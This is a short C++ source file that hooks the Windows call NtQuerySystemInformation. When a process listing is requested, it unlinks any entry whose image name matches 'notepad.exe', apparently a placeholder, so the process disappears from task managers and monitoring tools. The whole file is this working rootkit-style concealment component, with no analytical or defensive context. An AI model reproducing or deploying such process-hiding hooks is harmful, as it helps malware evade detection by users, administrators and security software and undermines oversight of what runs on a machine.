#include "Hooks.h"

#include <Definitions.h>
#include <hash/fnv1a.h>

/*
*   Hide process from being listed in process list when queried.
*/
LONG __stdcall hooks::HkNtQuerySystemInformation(UINT SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    NTSTATUS status = oNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemInformationClass == 5 && status == 0)
    {
        P_SYSTEM_PROCESS_INFORMATION prev = P_SYSTEM_PROCESS_INFORMATION(SystemInformation);
        P_SYSTEM_PROCESS_INFORMATION cur = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);

        while (prev->NextEntryOffset != NULL)
        {
            if (fnv1a::hash("notepad.exe") == fnv1a::hash(cur->ImageName.Buffer))
            {
                if (cur->NextEntryOffset == 0)
                    prev->NextEntryOffset = 0;
                else
                    prev->NextEntryOffset += cur->NextEntryOffset;

                cur = prev;
            }

            prev = cur;
            cur = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)cur + cur->NextEntryOffset);
        }
    }

    return status;
}